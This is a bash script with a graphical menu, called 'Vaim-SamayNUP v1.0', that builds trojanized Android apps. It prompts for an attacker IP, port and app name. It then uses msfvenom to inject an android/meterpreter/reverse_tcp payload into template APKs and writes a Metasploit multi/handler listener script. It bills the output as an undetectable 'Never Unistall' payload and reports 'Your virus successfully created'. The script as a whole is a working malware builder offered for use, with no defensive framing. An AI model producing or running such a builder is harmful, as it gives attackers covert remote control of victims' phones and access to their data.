#!/bin/bash
#==========================================================================================================================
#========================================================================================================================== 
#Vaim-SamayNUP v1.0
#don't use my code with giving me credit 
#if you use without giving me credit then you won't became a programmer so please respect
#Youtube channel : https://www.youtube.com/channel/UCDWhaLh7OIKzH4Bk952l7Iw
#Github (coded by vaimpier ritik x Samay ) >>> : https://github.com/VaimpierOfficial
#For business : sonuv0085@gmail.com
#vaimpier_ritik x SAMAY
#==========================================================================================================================
#==========================================================================================================================

Att_ck(){

ip=$(zenity --width=400 --height=250 --title Vaim-SamayNUP v1.0 --text "Enter your IP" --entry)
port=$(zenity --width=400 --height=250 --title Vaim-SamayNUP v1.0 --text "Enter your PORT" --entry)
name=$(zenity --width=400 --height=250 --title Vaim-SamayNUP v1.0 --text "Enter your Application" --entry)
pass=$(zenity --width=400 --height=250 --title Vaim-SamayNUP v1.0 --text "Enter your Password" --entry)
zenity --question --text="Do you want create .rb also?" --no-wrap --title Vaim-SamayNUP v1.0 --ellipsize

if [ "$?" -eq "0" ];then
	start

elif [ "$?" -eq "1" ];then
	start_w
else
	Att_ck
fi

}

scs(){

#ipp=$(zenity --width=400 --height=250 --title Vaim-SamayNUP v1.0 --text "Enter your IP" --entry)
#por=$(zenity --width=400 --height=250 --title Vaim-SamayNUP v1.0 --text "Enter your PORT" --entry)
zenity --info --width=200 --title Vaim-SamayNUP v1.0 --text "Your virus successfully created on out/${name}.apk"
menu

}


start(){

ipp=$(zenity --width=400 --height=250 --title Vaim-SamayNUP v1.0 --text "Enter your IP for RB" --entry)
por=$(zenity --width=400 --height=250 --title Vaim-SamayNUP v1.0 --text "Enter your PORT for RB" --entry)
num=$(zenity --width=400 --height=250 --title Vaim-SamayNUP v1.0 --text "Enter your NUP (1/2)" --entry)
opr | zenity --progress --auto-close --width=400 --height=250 --title "Buiding Started..."
scs

}

opr(){

echo 2
echo "#Collecting ${ip}:${port}"
sleep 1

echo 25
unzip -P ${pass} -q VSNUP.zip
msfvenom -x NUP${num}.apk -p android/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -o $(pwd)/out/${name}.apk
rm -f NUP1.apk NUP2.apk 
echo "#Creating NUP"
sleep 1

echo 80
echo "
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST ${ipp}
set LPORT ${por}
set ExitOnSession false
exploit -j
" > $(pwd)/out/${name}.rb
echo "#Creating .RB"
sleep 1

echo 100
echo "#Sucessfully"

}

nonstart(){

echo 2
echo "#Collecting ${ip}:${port}"
sleep 1

echo 25
unzip -P ${pass} -q VSNUP.zip
msfvenom -x NUP${num}.apk -p android/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -o $(pwd)/out/${name}.apk
rm -f NUP1.apk NUP2.apk
echo "#Creating NUP"
sleep 1

echo 100
echo "#Sucessfully"


}


start_w(){

num=$(zenity --width=400 --height=250 --title Vaim-SamayNUP v1.0 --text "Enter your NUP (1/2)" --entry)
nonstart | zenity --progress --auto-close --width=400 --height=250 --title "Building Started..."
scs

}

upp(){

echo 25
cd ..
rm -rf Vaim-SamayNUP
echo "#Removing"

echo 35
git clone https://github.com/VaimpierOfficial/Vaim-SamayNUP
echo "#Downloading resources"

echo 50
cd Vaim-SamayNUP
echo "#Setup"

echo 60
sudo chmod +x *
echo "#Giving permission"

echo 100
echo "#Successfully Downloaded"


}
Up_Date(){

upp | zenity --progress --auto-close --width=400 --height=250 --title "Updating..."
zenity --info --width=200 --title Vaim-SamayNUP v1.0 --text "Update Successfully"
sudo bash Vaim-SamayNUP.sh

}

Equit(){

exit
exit

}

menu(){

mai=$(zenity --title "Vaim-SamayNUP v1.0" --width=400 --height=250 --list --column Select --column  Options 1 Build 2 Update 3 Exit --height=250 --width=300 --text "This is for Creating FUD Never Unistall Payload." 2>&1)

case "${mai}" in 
	1) Ac=1;; 
	2) Ac=2;; 
	3) Ac=3;;
	*) menu;; 
esac


if [ "$Ac" -eq 1 ];then
	Att_ck
elif [ "$Ac" -eq 2 ];then
	Up_Date
elif [ "$Ac" -eq 3 ];then
	Equit
else
	menu
fi



}

apt install zenity curl
menu
